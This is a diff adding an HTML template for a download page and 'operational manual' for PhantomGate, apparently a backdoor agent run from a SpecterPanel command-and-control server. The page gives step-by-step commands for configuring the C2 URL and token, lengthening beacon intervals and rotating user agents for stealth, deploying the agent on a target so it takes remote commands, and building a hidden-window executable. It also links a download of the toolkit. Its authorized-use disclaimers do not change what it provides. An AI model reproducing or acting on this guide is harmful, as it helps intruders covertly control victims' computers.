@@ -1,0 +1,498 @@
+{% extends "base.html" %}
+
+{% block title %}SPECTERPANEL + PHANTOMGATE // DEPLOYMENT MANUAL{% endblock %}
+
+{% block extra_style %}
+<style>
+  /* HACKING THEME OVERRIDES */
+  body {
+    background: #0a0c0f;
+  }
+  .matrix-bg {
+    opacity: 0.25;
+  }
+  .docs-container {
+    max-width: 1100px;
+    margin: 2rem auto;
+    padding: 0 1.5rem;
+    font-family: 'Fira Code', 'Courier New', monospace;
+  }
+  /* Terminal header */
+  .terminal-header {
+    background: #0f111a;
+    border: 1px solid #2dd4bf;
+    border-radius: 12px 12px 0 0;
+    padding: 0.75rem 1rem;
+    display: flex;
+    align-items: center;
+    gap: 0.75rem;
+    font-family: monospace;
+    font-size: 0.85rem;
+    color: #2dd4bf;
+    margin-bottom: 2rem;
+    box-shadow: 0 0 15px rgba(45,212,191,0.2);
+  }
+  .terminal-header .dots {
+    display: flex;
+    gap: 0.4rem;
+  }
+  .terminal-header .dot {
+    width: 12px;
+    height: 12px;
+    border-radius: 50%;
+    background: #2dd4bf;
+    opacity: 0.7;
+  }
+  .terminal-header .path {
+    background: #01040f;
+    padding: 0.2rem 0.6rem;
+    border-radius: 6px;
+    color: #a5f3fc;
+  }
+  .terminal-header .cursor {
+    animation: blink 1s step-end infinite;
+  }
+  @keyframes blink {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0; }
+  }
+  /* Glitch effect */
+  .glitch {
+    font-size: 2.2rem;
+    font-weight: 800;
+    text-transform: uppercase;
+    position: relative;
+    text-shadow: 0.05em 0 0 #ff00c1, -0.05em -0.025em 0 #00ff9d;
+    animation: glitch 500ms infinite;
+    color: #e2e8f0;
+    letter-spacing: 2px;
+  }
+  @keyframes glitch {
+    0% { text-shadow: 0.05em 0 0 #ff00c1, -0.05em -0.025em 0 #00ff9d; }
+    25% { text-shadow: -0.05em 0 0 #ff00c1, 0.05em 0.025em 0 #00ff9d; }
+    50% { text-shadow: 0.05em -0.025em 0 #ff00c1, -0.05em 0 0 #00ff9d; }
+    75% { text-shadow: -0.05em 0.025em 0 #ff00c1, 0.05em 0 0 #00ff9d; }
+    100% { text-shadow: 0.05em 0 0 #ff00c1, -0.05em -0.025em 0 #00ff9d; }
+  }
+  /* Cards */
+  .step-card {
+    background: rgba(10, 20, 30, 0.75);
+    backdrop-filter: blur(12px);
+    border-radius: 20px;
+    border: 1px solid #2dd4bf;
+    box-shadow: 0 0 20px rgba(45,212,191,0.2), inset 0 1px 0 rgba(45,212,191,0.1);
+    padding: 1.8rem;
+    margin-bottom: 2.2rem;
+    transition: all 0.2s ease;
+  }
+  .step-card:hover {
+    border-color: #00ff9d;
+    box-shadow: 0 0 25px rgba(0,255,157,0.3);
+    transform: translateY(-3px);
+  }
+  .step-title {
+    font-size: 1.5rem;
+    font-weight: 700;
+    margin-bottom: 1.2rem;
+    color: #00ff9d;
+    display: flex;
+    align-items: center;
+    gap: 0.8rem;
+    border-bottom: 1px dashed #2dd4bf;
+    padding-bottom: 0.5rem;
+    font-family: 'Fira Code', monospace;
+    text-shadow: 0 0 3px #00ff9d;
+  }
+  .step-title i {
+    font-size: 1.7rem;
+  }
+  .step-content {
+    color: #ccffdd;
+    font-family: 'Fira Code', monospace;
+    line-height: 1.5;
+  }
+  .step-content p {
+    margin: 1rem 0;
+  }
+  .code-block {
+    background: #01040f;
+    border-radius: 12px;
+    padding: 1rem 1.2rem;
+    margin: 1rem 0;
+    border-left: 4px solid #00ff9d;
+    font-family: 'Fira Code', monospace;
+    font-size: 0.85rem;
+    overflow-x: auto;
+    white-space: pre-wrap;
+    word-break: break-word;
+    color: #b9f2ff;
+    box-shadow: inset 0 0 8px rgba(0,255,157,0.1);
+  }
+  .inline-code {
+    background: #0f172a;
+    padding: 0.2rem 0.4rem;
+    border-radius: 6px;
+    font-family: monospace;
+    font-size: 0.85rem;
+    color: #00ff9d;
+    border: 1px solid #2dd4bf;
+  }
+  .badge {
+    background: #2dd4bf20;
+    border-radius: 20px;
+    padding: 0.2rem 0.7rem;
+    font-size: 0.7rem;
+    display: inline-block;
+    margin-right: 0.5rem;
+    color: #a5f3fc;
+    border: 1px solid #2dd4bf;
+  }
+  /* Priority boxes */
+  .config-item {
+    margin: 1.2rem 0;
+    padding: 1rem;
+    border-radius: 16px;
+    background: rgba(0, 0, 0, 0.4);
+    border: 1px solid;
+  }
+  .priority-high {
+    border-color: #ff4d6d;
+    box-shadow: 0 0 10px #ff4d6d40;
+  }
+  .priority-high strong {
+    color: #ff6b8a;
+  }
+  .priority-medium {
+    border-color: #ffb347;
+    box-shadow: 0 0 8px #ffb34730;
+  }
+  .priority-medium strong {
+    color: #ffcc88;
+  }
+  .priority-low {
+    border-color: #2dd4bf;
+    box-shadow: 0 0 5px #2dd4bf30;
+  }
+  .priority-low strong {
+    color: #a5f3fc;
+  }
+  .warning-box {
+    background: rgba(255, 50, 50, 0.15);
+    border-left: 4px solid #ff4d6d;
+    padding: 1rem;
+    border-radius: 12px;
+    margin-bottom: 2rem;
+    backdrop-filter: blur(5px);
+    font-family: monospace;
+    color: #ffa0a0;
+  }
+  hr {
+    border-color: #2dd4bf40;
+    margin: 1.5rem 0;
+  }
+  .file-path {
+    background: #0f172a;
+    padding: 0.2rem 0.6rem;
+    border-radius: 6px;
+    font-family: monospace;
+    font-size: 0.85rem;
+    color: #00ff9d;
+  }
+  .hacker-prompt {
+    background: #01040f;
+    display: inline-block;
+    padding: 0.2rem 0.6rem;
+    border-radius: 8px;
+    font-family: monospace;
+    color: #00ff9d;
+    margin-top: 0.5rem;
+  }
+  .folder-structure {
+    background: #01040f;
+    padding: 1rem;
+    border-radius: 12px;
+    font-family: monospace;
+    font-size: 0.85rem;
+    color: #a5f3fc;
+    margin: 1rem 0;
+    border: 1px solid #2dd4bf40;
+  }
+  .footer-note {
+    text-align: center;
+    color: #5b6e8c;
+    font-family: monospace;
+    font-size: 0.75rem;
+    margin-top: 2rem;
+  }
+  /* Download button and header actions */
+  .header-actions {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom: 1rem;
+    flex-wrap: wrap;
+  }
+  .btn-download {
+    background: linear-gradient(135deg, #0f172a, #01040f);
+    border: 2px solid #00ff9d;
+    border-radius: 50px;
+    padding: 0.6rem 1.2rem;
+    font-family: 'Fira Code', monospace;
+    font-weight: bold;
+    font-size: 0.9rem;
+    color: #00ff9d;
+    transition: all 0.3s ease;
+    box-shadow: 0 0 10px rgba(0,255,157,0.3);
+    text-decoration: none;
+    cursor: pointer;
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+  }
+  .btn-download:hover:not(.disabled) {
+    background: #00ff9d20;
+    box-shadow: 0 0 20px rgba(0,255,157,0.6);
+    transform: scale(1.02);
+    color: #fff;
+  }
+  .btn-download.disabled {
+    opacity: 0.5;
+    cursor: not-allowed;
+  }
+  /* Modal customization */
+  .modal-content {
+    background: #0a0f1f;
+    border: 1px solid #2dd4bf;
+    border-radius: 20px;
+    box-shadow: 0 0 30px rgba(0,255,157,0.2);
+    color: #ccffdd;
+    font-family: 'Fira Code', monospace;
+  }
+  .modal-header {
+    border-bottom: 1px solid #2dd4bf;
+  }
+  .modal-title {
+    color: #00ff9d;
+  }
+  .modal-footer {
+    border-top: 1px solid #2dd4bf;
+  }
+  .terms-text {
+    max-height: 300px;
+    overflow-y: auto;
+    background: #01040f;
+    padding: 1rem;
+    border-radius: 12px;
+    margin: 1rem 0;
+    font-size: 0.85rem;
+    color: #b9f2ff;
+  }
+  .form-check-input:checked {
+    background-color: #00ff9d;
+    border-color: #00ff9d;
+  }
+</style>
+{% endblock %}
+
+{% block body %}
+<div class="docs-container">
+  <div class="header-actions">
+    <div class="terminal-header" style="flex:1; margin-bottom:0;">
+      <div class="dots">
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+      </div>
+      <div class="path">root@specter:~/backdoor#</div>
+      <div class="cursor">_</div>
+      <span style="margin-left: auto; font-size: 0.7rem;">[ACCESS GRANTED]</span>
+    </div>
+    <div class="download-area">
+      <button class="btn-download" data-bs-toggle="modal" data-bs-target="#termsModal">
+        <i class="fas fa-download"></i> DOWNLOAD PHANTOMGATE
+      </button>
+    </div>
+  </div>
+
+  <div class="glitch">// SPECTERPANEL + PHANTOMGATE //</div>
+  <p style="text-align: center; font-family: monospace; margin-bottom: 2rem; color: #8aaac0;">» operational manual · stealth edition «</p>
+
+  <div class="folder-structure">
+    <i class="fas fa-folder-open"></i> PhantomGate Structure:<br>
+    backdoor/<br>
+    &nbsp;&nbsp;|-- phantomgate.py<br>
+    &nbsp;&nbsp;|-- setting.py
+  </div>
+
+  <div class="warning-box">
+    <strong><i class="fas fa-skull-crossbones"></i> [WARNING]</strong> UNAUTHORIZED ACCESS IS ILLEGAL<br>
+    This toolkit is intended for authorized penetration testing and red-team exercises only. Misuse is punishable by law.
+  </div>
+
+  <!-- Step 1 -->
+  <div class="step-card">
+    <div class="step-title">
+      <i class="fas fa-key"></i> STEP 1 :: TOKEN ACQUISITION
+    </div>
+    <div class="step-content">
+      <p>Log into SpecterPanel and navigate to <span class="inline-code">Settings → API Token</span>. Generate a fresh token.</p>
+      <div class="code-block">
+$ curl -X POST https://your-panel.com/api/token/generate \
+  -H "Authorization: Bearer &lt;master_key&gt;"
+# Response:
+sp_eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZ2VudF9tYW5hZ2VyIn0.3fZ9mE2pQ4R7tY1uI8oP0
+      </div>
+      <p><span class="badge">⚠️ OPSEC</span> Store token in environment variables. Rotate every 72h.</p>
+    </div>
+  </div>
+
+  <!-- Step 2 : Configure PhantomGate -->
+  <div class="step-card">
+    <div class="step-title">
+      <i class="fas fa-cog"></i> STEP 2 :: CONFIGURE PHANTOMGATE
+    </div>
+    <div class="step-content">
+      <p>Edit <span class="file-path">setting.py</span> (inside the <span class="inline-code">backdoor/</span> folder). The file contains a class <span class="inline-code">Setting</span> with method <span class="inline-code">setting_var()</span> that initializes all settings. Below are the critical parameters, prioritized by importance.</p>
+
+      <div class="config-item priority-high">
+        <strong><i class="fas fa-skull"></i> █ HIGH PRIORITY (must change)</strong>
+        <ul style="margin-top: 0.5rem;">
+          <li><span class="inline-code">self.API_TOKEN</span> – Paste your token from Step 1.</li>
+          <li><span class="inline-code">self.url</span> – Your SpecterPanel C2 URL (e.g., <span class="inline-code">https://c2.domain.com</span>).</li>
+        </ul>
+        <div class="code-block">
+self.API_TOKEN = "sp_eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
+self.url = "https://your-panel.com"
+        </div>
+      </div>
+
+      <div class="config-item priority-medium">
+        <strong><i class="fas fa-shield-virus"></i> █ MEDIUM PRIORITY (recommended)</strong>
+        <ul>
+          <li><span class="inline-code">self.ENCRYPTION_KEY</span> – Generate a new 16-byte key: <span class="inline-code">os.urandom(16)</span>.</li>
+          <li><span class="inline-code">self.MAIN_LOOP_DELAY</span> – Beacon interval (default 15 sec). Increase to 30–60 for stealth.</li>
+          <li><span class="inline-code">self.USER_AGENTS</span> – Rotate realistic browser user agents.</li>
+          <li><span class="inline-code">self.PROXIES</span> – Route traffic through proxy chain (optional).</li>
+        </ul>
+        <div class="code-block">
+self.ENCRYPTION_KEY = b'\x...'  # new 16 bytes
+self.MAIN_LOOP_DELAY = 45
+self.USER_AGENTS = ["Mozilla/5.0 ...", ...]
+self.PROXIES = ['http://proxy:8080']
+        </div>
+      </div>
+
+      <div class="config-item priority-low">
+        <strong><i class="fas fa-robot"></i> █ LOW PRIORITY (optional tuning)</strong>
+        <ul>
+          <li><span class="inline-code">self.PORT</span> – Port scan list.</li>
+          <li><span class="inline-code">self.BASE_DELAY</span>, <span class="inline-code">self.MAX_DELAY</span>, <span class="inline-code">self.MIN_DELAY</span> – Network timing.</li>
+          <li><span class="inline-code">self.ADAPTIVE_THRESHOLD</span> – Traffic shaping.</li>
+          <li><span class="inline-code">self.FAKE_HEADERS</span> – Binary headers for protocol mimicry.</li>
+        </ul>
+        <p>Default values work for most scenarios; adjust only if you understand the impact.</p>
+      </div>
+      <p class="hacker-prompt"><i class="fas fa-terminal"></i> $ nano backdoor/setting.py &nbsp;&nbsp; # save and exit</p>
+    </div>
+  </div>
+
+  <!-- Step 3 : Run on Target -->
+  <div class="step-card">
+    <div class="step-title">
+      <i class="fas fa-terminal"></i> STEP 3 :: DEPLOY & ACTIVATE
+    </div>
+    <div class="step-content">
+      <p>Transfer the <span class="inline-code">backdoor/</span> folder to the target (authorized environment). Ensure Python 3.9+ is present.</p>
+      <div class="code-block">
+$ cd backdoor
+$ python3 phantomgate.py
+[+] Connecting to SpecterPanel...
+[+] Beacon established. Agent ID: 7f3a9c2e
+[+] Listening for commands...
+      </div>
+      <p>Once running, the agent appears in the panel. You can now issue commands remotely.</p>
+      <p><span class="badge">📡 C2</span> To stop: <span class="inline-code">Ctrl+C</span> or panel command <span class="inline-code">terminate</span>.</p>
+    </div>
+  </div>
+
+  <!-- Step 4 : Binary Hardening -->
+  <div class="step-card">
+    <div class="step-title">
+      <i class="fas fa-cube"></i> STEP 4 (OPTIONAL) :: COMPILE STANDALONE
+    </div>
+    <div class="step-content">
+      <p>Create a single executable to avoid Python dependency. Use PyInstaller:</p>
+      <div class="code-block">
+$ pip install pyinstaller
+$ cd backdoor
+$ pyinstaller --onefile --noconsole phantomgate.py
+$ ls dist/
+phantomgate.exe   # Windows
+phantomgate       # Linux/macOS
+      </div>
+      <p>Deploy the binary directly. <span class="badge">💀 stealth</span> Use <span class="inline-code">--noconsole</span> to hide window on Windows.</p>
+      <p>Note: If you embed <span class="inline-code">setting.py</span> using <span class="inline-code">--add-data</span>, ensure the binary finds it.</p>
+    </div>
+  </div>
+
+  <div class="footer-note">
+    <i class="fas fa-skull"></i> authorized use only · all logs are audited · stay frosty <i class="fas fa-ghost"></i>
+  </div>
+</div>
+
+<!-- Terms Modal -->
+<div class="modal fade" id="termsModal" tabindex="-1" aria-labelledby="termsModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-centered">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h5 class="modal-title" id="termsModalLabel"><i class="fas fa-gavel"></i> Terms of Use</h5>
+        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
+      </div>
+      <div class="modal-body">
+        <div class="terms-text">
+          <strong>⚠️ LEGAL NOTICE ⚠️</strong><br><br>
+          By downloading PhantomGate, you acknowledge and agree that:<br><br>
+          1. This software is intended solely for authorized security testing, penetration testing, and educational purposes within environments where you have explicit permission.<br><br>
+          2. Unauthorized use of this software to access, disrupt, or compromise systems without proper authorization is illegal and strictly prohibited.<br><br>
+          3. You assume full responsibility for any consequences arising from the use of this software.<br><br>
+          4. The developers and distributors of this software are not liable for any misuse or damage caused by this tool.<br><br>
+          5. You must comply with all applicable local, national, and international laws and regulations.<br><br>
+          <strong>I have read and agree to the above terms.</strong>
+        </div>
+        <div class="form-check mt-3">
+          <input class="form-check-input" type="checkbox" id="agreeTermsCheckbox">
+          <label class="form-check-label" for="agreeTermsCheckbox">
+            I agree to the terms and conditions
+          </label>
+        </div>
+      </div>
+      <div class="modal-footer">
+        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
+        <a id="downloadLink" href="{{ url_for('static', filename='downloads/phantomgate.zip') }}" class="btn-download disabled" download>
+          <i class="fas fa-download"></i> Download
+        </a>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+  document.addEventListener('DOMContentLoaded', function() {
+    const agreeCheckbox = document.getElementById('agreeTermsCheckbox');
+    const downloadLink = document.getElementById('downloadLink');
+    
+    function updateDownloadButton() {
+      if (agreeCheckbox.checked) {
+        downloadLink.classList.remove('disabled');
+        downloadLink.removeAttribute('disabled');
+      } else {
+        downloadLink.classList.add('disabled');
+        downloadLink.setAttribute('disabled', 'disabled');
+      }
+    }
+    
+    agreeCheckbox.addEventListener('change', updateDownloadButton);
+    updateDownloadButton();
+  });
+</script>
+{% endblock %}
